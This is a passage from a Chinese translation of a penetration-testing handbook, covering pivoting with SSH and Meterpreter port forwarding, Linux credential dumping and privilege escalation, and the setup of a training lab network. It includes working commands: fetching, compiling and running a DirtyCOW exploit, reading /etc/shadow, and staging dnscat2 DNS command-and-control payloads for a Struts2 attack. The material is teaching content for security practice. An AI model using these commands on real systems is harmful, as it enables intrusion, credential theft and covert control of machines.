我们的 VPS。我们还将在攻击者机器上配置本地端口，在本例中是3389（RDP），以将任何
发送到该端口的流量转发到我们的 VPS。当该端口上的流量转发到我们的 VPS 时，它会将该
流量发送到 VPS 上 3389 端口上的本地主机。最后，我们需要在 3389 端口上设置一个监听
我们的 VPS 的端口，并使用 Meterpreter 的端口转发功能通过被攻陷的受害机器设置一个端
口转发，以能连接到受害者的系统。
1. 用 Meterpreter payload 攻击受害者
2. 在我们的机器上开启 SSH，并在我们的攻击者系统上设置本地端口转发（本地监听端口
3389），以将针对该端口的所有流量发送到 3389 上的 VPS 本地主机端口。
ssh -i key.pem ubuntu@[VPS IP] -L 127.0.0.1:3389:127.0.0.1:3389
3. 在 Meterpreter 会话上设置一个前置端口以监听端口3389上的 VPS，并通过被攻陷的机
器将该流量发送到下一个要横向移动到的服务器。
portfwd add -l 3389 -p 3389 -r [Victim via RDP IP Address]
4. 在我们的攻击者机器上，打开我们的 Microsoft 远程桌面客户端，将你的连接设置为你自
己的本地主机 -127.0.0.1，然后输入受害者的凭据以通过 RDP 进行连接。
151
第4章 带球——开始攻击网络
在 Linux 中横向移动
在 Linux 中的操作多年来变化不大。通常，如果你使用的是 dnscat2 或 Meterpreter，它们都
支持自己的转发。
dnscat2:
listen 127.0.0.1:9999 :22
Metasploit
post/windows/manage/autoroute
Metasploit Socks Proxy + Proxychains
use auxiliary/server/socks4a
Meterpreter:
portfwd add –l 3389 –p 3389 –r
如果你幸运地获得了一个 SSH shell，那么我们可以通过该系统进行渗透。我们如何获得
SSH shell 呢？在许多情况下，一旦我们可以实现本地文件包含（LFI）或远程代码执行
（RCE），我们可以尝试权限升级以读取 /etc/shadow 文件（和密码破解），或者我们可以
利用一些 Mimimikatz 风格的方法。
与 Windows 和 Mimikatz 一样，Linux 系统也有同样的问题，密码以明文形式存储。
@huntergregal 编写的工具可以转储特定进程，这些进程很可能以明文形式包含用户的密码。
尽管迄今为止，这只适用于有限版本的 Linux 系统，但这个相同的概念可以在整个系统中使
152
第4章 带球——开始攻击网络
用。你可以在这里准确地看到哪些系统以及从何处获取密码：
https://github.com/huntergregal/mimipenguin
一旦我们在被入侵的主机上获得了凭证，并且可以通过 SSH 反弹 shell，我们就可以通过这
个隧道传输流量，并在机器之间进行数据隐藏。在 SSH 中，有一些很好的特性可以让我们执
行这个操作过程：
设置动态 Sock Proxy 以使用 proxychains 通过主机隐藏我们的所有流量：
ssh -D 127.0.0.1:8888 -p 22 @
单个端口的基本端口转发：
ssh @ -L 127.0.0.1:55555::80
通过 SSH 的 VPN。这是一个非常棒的特性，使得可以通过 SSH 隧道隐蔽传输第3层网
络流量。
https://artkond.com/2017/03/23/pivoting-guide/#vpn-over-ssh
Linux 提权
Linux 权限提升在很大程度上与 Windows 类似。我们寻找可以写入的易受攻击的服务、那些
棘手的错误配置、平面文件中的密码、所有的可写文件、计划任务，当然还有修补问题。
在有效和高效地分析 Linux 系统中的权限提升问题方面，我们可以使用一些工具来为我们完
成所有的工作。
在我们进行任何类型的权限提升攻击之前，我首先要在 Linux 主机上进行一个良好的信息收
集工作，并识别所有关于系统的信息。这包括用户、服务、定时任务、软件版本、弱信任对
象、错误配置的文件权限，甚至是 Docker 信息。我们可以使用一个名为 LinEnum 的工具来
为我们完成所有的累活（ https://github.com/rebootuser/linenum ）。
153
第4章 带球——开始攻击网络
这是一个非常长的报告，内容是你可能想要了解的关于底层系统的所有信息，这对于未来的
活动来说是非常好的。
一旦我们获得了关于系统的信息，我们就会试图看看我们是否能够利用这些漏洞中的任何一
个。如果我们找不到任何可用的漏洞或服务、计划任务中的错误配置，我们将直接在系统或
应用程序上进行攻击。我试着最后做这些，因为总是有一个潜在的可能性可以直接使系统挂
掉。
我们可以运行一个名为 linux-exploit-suggester 的工具来分析主机系统并识别缺失的补丁和漏
洞。一旦识别出漏洞，该工具还将向你提供可用 PoC 漏洞的链接。
154
第4章 带球——开始攻击网络
现在，我们要利用什么呢？这就是经验和实践真正发挥作用的地方。在我的实验中，我将配
置大量不同的 Linux 版本，以验证这些漏洞攻击不会使底层系统崩溃。在这个场景中，我最
喜欢的一个漏洞是 DirtyCOW。
DirtyCOW 的工作原理是“在Linux内核的内存子系统处理写访问时只读私有映射 COW 情况中
断的方式中发现了竞争条件。非特权本地用户可以使用此缺陷获取对其他只读内存映射的写
访问权限，从而增加他们在系统上的权限。”[https://dirtycow.ninja/]
简而言之，此漏洞允许攻击者通过内核漏洞从非特权用户转到 权限。这是我们能想到
root
的的最佳权限提升的方法！但有一个问题是它会导致一些内核崩溃，所以我们必须确保在正
确的 Linux 内核上使用正确的版本。
在 Ubuntu 上测试 DirtyCOW (ubuntu 14.04.1 LTS 3.13.0-32-generic x86_64)：
下载 DirtyCOW payload
wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c
编译 DirtyCOW payload
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
运行 DirtyCOW 以访问系统
./dirtycow-mem
关闭定期写回以使漏洞稳定
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
Try reading the shadow file
cat /etc/shadow
155
第4章 带球——开始攻击网络
Linux 横向移动实验
横向移动的问题是，没有一个设置起点逐步深入的环境很难练习。因此，我们向你介绍了
CSK 网络安全实验。在这个实验中，你将在不同的设备之间进行切换，使用最近的漏洞攻击
和权限提升攻击，并利用 Linux 环境中本身存在的应用程序进行攻击。
设置虚拟环境
这个虚拟实验环境的设置有些复杂。这是因为网络需要三个不同的静态虚拟机才能运行，并
且你需要事先进行一些设置。所有这些都在 VMware Workstation 和 VMware Fusion 中进行
了测试，因此如果你使用的是 VirtualBox，那么你可能需要对它进行适当的调整。
下载三台虚拟机：
http://thehackerplaybook.com/get.php?type=csk-lab
虽然你不需要这些系统的 root 帐户，但 hacker/changeme 是用户名/密码，尽量不要更
改。
所有三台虚拟机都配置为使用 NAT 网络接口。要使该实验环境正常工作，你必须在 VMware
中配置虚拟机的 NAT 设置，才能使用172.16.250.0/24网络。要在 Windows VMware
Workstation 中执行此操作，请执行以下操作：
在开始菜单，依次点击 编辑 -> 虚拟网络编辑器 -> 更改设置
选择需要设置 NAT 类型的界面(我这里设置的是 VMnet8)
修改子网 IP 为 172.16.250.0 ，并点击 应用
在 OSX 中，操作更复杂。你需要：
复制原始的 dhcpd.conf 作为备份
sudo cp /Library/Preferences/VMware\
Fusion/vmnet8/dhcpd.conf/Library/Preferences/VMware\
Fusion/vmnet8/dhcpd.conf.bakup
编辑 dhcpd.conf 文件以使用172.16.250.x 而不是192.168.x.x
sudo vi /Library/Preferences/VMware\ Fusion/vmnet8/dhcpd.conf
编辑 nat.conf 以使用正确的网关
sudo vi /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf
#NAT gateway address
ip = 172.16.250.2
netmask = 255.255.255.0
重新启动服务：
sudo /Applications/VMware\ Fusion.app/Contents/Library/services/services.sh --
stop
sudo /Applications/VMware\ Fusion.app/Contents/Library/services/services.sh --
start
156
第4章 带球——开始攻击网络
现在，你应该能够在 NAT 模式下启动 THP Kali VM，并在172.16.250.0/24范围内获得一个
DHCP 分配的 IP。如果你这样做了，就同时启动所有其他三个实验虚拟机，然后开始黑客攻
击吧。
攻击 CSK 安全网络
最后，你已经从 Windows 环境转到了安全生产环境网络中。从你所有的侦察和研究中，你知
道所有的秘密都存储在这里。这是他们保护最严密的网络之一，我们知道他们已经分步部署
了他们的安全基础设施。从他们的文档来看，似乎有多个 VLAN 需要进行入侵，而且你似乎
需要在各个系统之间切换才能访问核心数据库。这就是你发起这次攻击的目的......
以安全网络区域的外部为中心，可以看到为此环境配置的网络范围位于172.16.250.0/24网络
中。由于你对这个网络不太了解，你可以先进行一些非常简单的 nmap 扫描。你需要确定哪
些系统可以从网络外部访问，以确定如何启动攻击。
扫描网络:
nmap 172.16.50.0/24
你注意到有三个设备正在运行，但只有一个设备启用了 Web 端口。看起来其他两个设备与安
全网络之外是隔离的，这意味着我们必须首先入侵172.16.250.10设备才能转到其他两个服务
器。访问第一个系统（172.16.250.10），你会看到 Apache Tomcat 正在监听端口8080，而
一些 OpenCMS 在端口80上。运行 web fuzzer 时，你会注意到 OpenCMS 页面也在运行
Apache Struts2（或者是 struts2 showcase）。你的脑海立马想到了Equifax 数据泄露事件中
黑客的攻击手法。你喜出望外，太好了，但你还是要检查一下。在 msfconsole 上运行一个快
速搜索并测试漏洞 。
struts2_content_type_ognl
我们知道，CSK 会严格监控受保护的网络流量，其内部服务器可能不允许直接访问公司网
络。为了解决这个问题，我们必须使用我们的 DNS C2 payload 和 dnscat2 来通过 UDP 而不
是 TCP 进行通信。当然，在真实操作中，我们可能会使用权威的 DNS 服务器，但仅针对本
地测试的话，我们将配置自己的 DNS 服务器。
157
第4章 带球——开始攻击网络
[本书的 Kali 机器]
本书的定制 Kali 虚拟机应该拥有执行攻击的所有工具。
我们需要在 Web 服务器上放上我们的 payload，这样我们就可以让我们的 metasploit
payload 抓取 dnscat 恶意软件。在 dnscat2 客户机文件夹中是 dnscat 二进制文件。
cd /opt/dnscat2/client/
python -m SimpleHTTPServer 80
启动 dnscat 服务器
cd /opt/dnscat2/server/
ruby ./dnscat2.rb
为 dnscat 记录你的密钥
打开新终端并加载 Metasploit
msfconsole
搜索 struts2并加载 struts2漏洞